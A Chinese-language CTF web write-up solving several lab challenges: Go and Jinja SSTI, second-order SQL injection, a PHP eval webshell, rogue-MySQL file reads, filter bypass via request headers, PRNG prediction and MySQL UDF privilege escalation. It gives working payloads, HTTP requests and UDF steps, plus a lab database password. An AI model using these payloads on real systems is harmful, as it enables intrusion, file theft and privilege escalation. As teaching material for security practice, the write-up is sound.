# Write UP

## WEB

### ezssti

很简单的ssti

源码给了，调用Eval即可执行命令

```go
package main

import (
	"fmt"
	"net/http"
	"os/exec"
	"strings"
	"text/template"
)

type User struct {
	Id     int
	Name   string
	Passwd string
}

func (u User) Eval(command string) string {
	out, _ := exec.Command(command).CombinedOutput()
	return string(out)
}

func Login(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	username := strings.Join(r.PostForm["name"], "")
	password := strings.Join(r.PostForm["passwd"], "")
	user := &User{1, username, password}
	tpl1 := fmt.Sprintf(`<h1>Hi, ` + username + `</h1> This is SSTI, please post your name and password`)
	html, err := template.New("login").Parse(tpl1)
	html = template.Must(html, err)
	html.Execute(w, user)
}

func main() {
	server := http.Server{
		Addr: "0.0.0.0:8080",
	}
	fmt.Print("Server is running on 0.0.0.0:8080")
	http.HandleFunc("/login", Login)
	server.ListenAndServe()
}
```



```http
POST /login HTTP/1.1
Host: 10.244.0.254:28003
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

name={{.Eval "env"}}
```



### sql2login

SQL注入之二次注入。sqlilabs 24 关（中间）也是这个考点。考验刷sqlilabs的题量。

Hint1：看看index中的图，最下面有东西。

Hint2：sqlilabs第2x关。

Hint3：

```sql
"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```

运行部署：（cd进源码目录，会映射到9028端口）

```bash
docker-compose build && docker-compose up -d


快速构建：
docker build -t sql2login . && docker run -d --name=sql2login -p 9028:80 --rm sql2login

快速重启：
docker stop sql2login && docker rmi sql2login && docker build -t sql2login . && docker run -d --name=sql2login -p 9028:80 --rm sql2login
```

WP：

开局一张图。

![image-20240410062721081](https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240410062721081.png)

这个故事告诉我们，要少看瑟图，眼睛不要盯着不该看的地方，要不然就会使得我们获得hint。

![image-20240410062835820](https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240410062835820.png)

是个二次注入，title就是hint。

![image-20240410062928058](https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240410062928058.png)

题中我们的步骤是：

1、注册一个 `admin'#`的账号，密码是`123123`。

注册用户时，数据库内添加数据语句：（login_create.php）
`$sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";`
所以数据库内添加了一条数据，账号是 `admin’#`，密码是`123123`。

![image-20240410174104504](https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240410174104504.png)

2、接下来登录该帐号后进行修改密码，修改为111111

修改密码时，数据库内更新数据语句：（pass_change.php）
`$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";`

带入数据就是：
`$sql = "UPDATE users SET PASSWORD='111111' where username='admin'`  `#' and password='admin原来的密码' ";`

单引号是为了和之后密码修的用户名的单引号进行闭合，#是为了注释后面的数据。此时修改的就是 admin 的密码。

![image-20240410174129783](https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240410174129783.png)

![image-20240410174150830](https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240410174150830.png)

![image-20240410174159685](https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240410174159685.png)



### 真亦假，假亦真(HZNU版)

题目描述：开开心心签个到吧，祝各位师傅们好运~

`Jay17ashjdaskdhasadasdadsadssdasdadsasdasdasdasdxcvnxkjcvnxjcsdhkjashdjkadjk.php`

```php
<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);

//签到题，直接送大家shell了，做好事不留名，我叫Jay17

//标准一句话mua~
eval($_POST[1]);
?>
```

`index.php`

```php
<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file('Jay17ashjdaskdhasadasdadsadssdasdadsasdasdasdasdxcvnxkjcvnxjcsdhkjashdjkadjk.php');

//以代码输出代替命令执行结果，让选手误以为成功利用了一句话木马，但是一直得不到正确的flag。
//比如选手传参ls /,返回事先准备好的想让选手看见的根目录内容，选手传参cat /flag返回ISCTF{fake_flag}
//破局方法很简单，选手只需要ls和cat index.php亲自查看源码内容即可。
//不是什么难题，偏脑洞和趣味性，以及有时候眼睛看到的不一定是真的哈哈哈哈。


if (isset($_POST['1']) && (strpos($_POST['1'], 'flag') !== false || strpos($_POST['1'], 'f*') !== false || strpos($_POST['1'], 'fl*') !== false || strpos($_POST['1'], 'fla*') !== false || (strpos($_POST['1'], 'f') !== false  &&  strpos($_POST['1'], '?') !== false) ) ){
    echo 'HZNU{this_is_real_flag}';
} elseif( isset($_POST['1'])  &&  strpos($_POST['1'], 'ls') !== false &&  strpos($_POST['1'], 'ls ..') == false  &&  strpos($_POST['1'], 'ls /') == false  ){
    echo 'index.php';
}else{
    eval($_POST['1']);
}




eval($_POST['ljtn']);
?>
```

运行部署：（cd进源码目录，会映射到9024端口）

```bash
快速构建：
docker build -t hstof . && docker run -d --name=hstof -e FLAG=HZNUCTF{test_flag} -p 9032:80 --rm hstof

快速重启：
docker stop hstof && docker rmi hstof && docker build -t hstof . && docker run -d --name=hstof -e FLAG=HZNUCTF{test_flag} -p 9032:80 --rm hstof
```

WP：（有时候眼睛看见的不一定是真的，只是别人想让你看到的罢了）

能成功骗过蚂蚁剑，就是根目录下看不见/flag

![image-20240411184822028](https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240411184822028.png)

这句但凡你不相信我一次读一下`index.php`就能赢

```
1=cat /index.php
ljtn=cat /flag
```

### ezsql

利用LOAD DATA LOCAL INFILE来读取文件，

可以使用自己的mysql或者使用Rogue Mysql Server。

读取数据库用户名密码，然后访问

```http
POST /query.php HTTP/1.1
Host: 10.244.0.254:28002
Content-Length: 72
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.244.0.254:28004
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.244.0.254:28004/
Cookie: PHPSESSID=ezsql
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

host=127.0.0.1&username=root&password=asd222%21%21%40332asc&dbname=mysql
```

利用load_file函数读取文件

```http
POST /query.php HTTP/1.1
Host: 10.244.0.254:28002
Content-Length: 32
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.244.0.254:28004
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.244.0.254:28004/query.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=ezsql
Connection: close

sql=select+load_file('/flag')%3b
```



### suid

开局查看注释提示

 <!-- Go eval.php-->

```php
<?php
highlight_file(__FILE__);
// var_dump($_POST);
if (isset($_POST["s_1.1"])) {
    echo "level 1"."<br>";
    if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_POST['cmd'])) {
        if (!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i', $_POST['cmd'])) {
            echo 'success!'.'<br>';
            eval($_POST['cmd']);
        }
    }
} else {
    echo "nonono 1";
}
nonono 1
```

需要传参给s_1.1则s[1.1=1即可，然后利用http headers来达到任意参数

```http
POST /eval.php HTTP/1.1
Host: 10.244.0.254
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
A: bash -p -c "cat /flag"

cmd=system(current(array_reverse(getallheaders())));&s[1.1=1
```

### 炼狱waf-S

本题思路利用subprocess.Popen来执行命令

payload：

```
{{[].__class__.__base__.__subclasses__()[351]('cat /proc/1/en*',shell=True,stdout=-1).communicate()[0].strip()}}
```

![image-20240415131007885](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240415131007885.png)

### gogogo

首先来到第一关，很明显的伪随机数，不过要猜是第几个，种子推测是时间为种子

![image-20240415131810987](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240415131810987.png)

本地测试代码，利用未来时间作为种子即可，然后对应时间提交。

```go
package main

import (
	"fmt"
	"math/rand"
)

func main() {
	rand.Seed(1713158260)
	// 生成一个随机数
	randomNumber1 := rand.Int()
	randomNumber2 := rand.Int()
	randomNumber3 := rand.Int()
	randomNumber4 := rand.Int()
	randomNumber5 := rand.Int()
	randomNumber6 := rand.Int()
	randomNumber7 := rand.Int() + randomNumber1 - randomNumber1 + randomNumber2 - randomNumber2 + randomNumber3 - randomNumber3 + randomNumber4 - randomNumber4 + randomNumber5 - randomNumber5 + randomNumber6 - randomNumber6
	// 输出生成的随机数
	fmt.Println("中奖号码为:", randomNumber1)
	fmt.Println("中奖号码为:", randomNumber2)
	fmt.Println("中奖号码为:", randomNumber3)
	fmt.Println("中奖号码为:", randomNumber4)
	fmt.Println("中奖号码为:", randomNumber5)
	fmt.Println("中奖号码为:", randomNumber6)
	fmt.Println("中奖号码为:", randomNumber7)

	//当前时间戳为:1712906207
	//中将号码为:5083385238485808331
}

```

![image-20240415131937056](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240415131937056.png)

第二关，简单的整数溢出，是`-20000-（int16）tax`的自己测试就可以了

![image-20240415140031891](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240415140031891.png)

第三关，CVE-2019-14809，这个漏洞是解析错误

![image-20240415140953599](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240415140953599.png)

题目源码基本没有改，就是改了一个port，用:替代或者爆破。

payload：

```
http://root:P@ssw0rd!@[127.0.0.1]['Pwned!']:/flag.php
```



### hardsql

首先利用LOAD DATA local来从mysql客户端读取文件上传到mysql伪造服务端。

读取源码，然后拿到数据库密码，然后直接连接数据库

这里可以使用自己配置过的mysql服务器，也可以使用开源项目的（Rogue mysql server）我用的是[rmb122/rogue_mysql_server](https://github.com/rmb122/rogue_mysql_server)

![image-20240401152241049](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240401152241049.png)

读取源码

![image-20240401152559027](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240401152559027.png)

![image-20240401152634921](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240401152634921.png)

```php
<?php
session_start();
// 指定数据库连接信息
// MYSQL_USER: root
// MYSQL_PASSWORD: asd222!!@332asc
$status = 0;

if (isset($_POST["host"])) {
  $host = $_POST["host"];
  $username = $_POST["username"];
  $password = $_POST["password"];
  $dbname = $_POST["dbname"];
  $status = 0;
} else {
  $host = $_SESSION["host"];
  $username = $_SESSION["username"];
  $password = $_SESSION["password"];
  $dbname = $_SESSION["dbname"];
  $status = 1;
}


// 连接数据库
$conn = new mysqli($host, $username, $password, $dbname);

// 检查连接
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

// $conn->options(MYSQLI_OPT_LOCAL_INFILE, true);

if ($status == 0) {
  $_SESSION["host"] = $_POST["host"];
  $_SESSION["username"] = $_POST["username"];
  $_SESSION["password"] = $_POST["password"];
  $_SESSION["dbname"] = $_POST["dbname"];

}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Query</title>
</head>

<style>
  form {
    width: 600px;
    margin: 0 auto;
  }

  label {
    display: block;
    margin-bottom: 10px;
  }

  input,
  textarea {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 20px;
  }

  #submit {
    background: #3498db;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
  }
</style>

<body>
  <form method="post" action="query.php">

    <h2>Execute SQL</h2>

    <label for="sql">SQL Statement:</label>
    <input id="sql" name="sql"></input>

    <input type="submit" id="submit" value="Submit">

  </form>
</body>

</html>
<?php

if (isset($_POST["sql"])) {
  $result = $conn->query($_POST["sql"]);
  // var_dump($result);
  if ($result->num_rows > 0) {
    echo "<table>";
    while ($row = $result->fetch_assoc()) {
      echo "<tr>";
      foreach ($row as $key => $val) {
        echo "<td>$key: $val</td>";
      }
      echo "</tr>";
    }
    echo "</table>";
  } else {
    if ($result == false) {
      echo "error: ". mysqli_error($conn);
    } else
      echo "Query executed successfully.";
  }

}
// 关闭连接
$conn->close();

?>
```

然后连接数据库进行udf提权

查看安全权限、插件目录

![image-20240401153729339](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240401153729339.png)

![image-20240401153705220](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240401153705220.png)

16进制导出方法（windows）：

```
select hex(load_file('C:\\lib_mysqludf_sys_32.dll')) into dumpfile 'C:\\lib_mysqludf_sys_32.txt';
```

上传到对应文件中：

```
SELECT 0x(SO或者dll文件16进制编码) into DUMPFILE "/usr/lib/mariadb/plugin/udf.so"
```

如果一次不行要记得先导入表中分两次导入即可

创建函数：

```
create function sys_eval returns string soname 'udf.so';
```

提权以后：

![image-20240401154206341](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240401154206341.png)

![image-20240401154232613](https://gitee.com/fpointzero/imgforit/raw/master/img/image-20240401154232613.png)